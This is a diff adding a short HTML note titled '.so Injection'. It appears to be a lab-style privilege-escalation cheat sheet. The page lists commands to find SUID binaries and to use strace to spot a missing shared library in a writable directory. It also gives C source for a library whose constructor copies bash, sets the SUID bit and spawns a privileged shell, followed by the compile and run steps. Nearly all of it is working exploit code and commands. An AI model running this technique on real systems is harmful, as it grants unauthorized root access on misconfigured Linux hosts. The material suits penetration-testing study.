@@ -1,0 +1,27 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>.so Injection</title>
+</head><body>find / -type f -perm -04000 -exec ls {} \; 2&gt;/dev/null<br/>
+<br/>
+#in this case, an executable file suid-so was found<br/>
+<br/>
+strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -i -E "open|access|no such file"<br/>
+&nbsp;&#09;Notice if a .so file is missing from a writable directory<br/>
+<br/>
+mkdir /home/user/.config<br/>
+nano libcalc.c<br/>
+<br/>
+#include &lt;stdio.h&gt;<br/>
+#include &lt;stdlib.h&gt;<br/>
+<br/>
+static void inject() __attribute__((constructor));<br/>
+<br/>
+void inject() {<br/>
+&nbsp;&#09;system("cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p");<br/>
+}<br/>
+<br/>
+gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c<br/>
+/usr/local/bin/./suid-so<br/>
+</body></html>
